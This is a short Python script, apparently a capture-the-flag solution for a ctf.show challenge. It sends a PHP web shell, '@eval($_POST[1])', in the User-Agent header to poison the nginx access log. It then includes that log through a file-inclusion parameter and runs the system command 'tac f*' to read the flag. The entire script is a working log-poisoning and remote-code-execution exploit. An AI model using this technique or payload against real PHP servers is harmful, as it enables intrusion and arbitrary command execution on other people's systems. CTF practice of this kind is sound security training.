import requests
url = "http://67b74f59-0c6c-4532-84ef-618b6c2c1a84.challenge.ctf.show/" + "?isVIP=1"
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0<?php @eval($_POST[1]);?>'
}
data = {
    'ctf': '/var/log/nginx/access.log',
    '1':'system("tac f*");'
}
r = requests.post(url=url, headers=headers, data=data).text
print(r)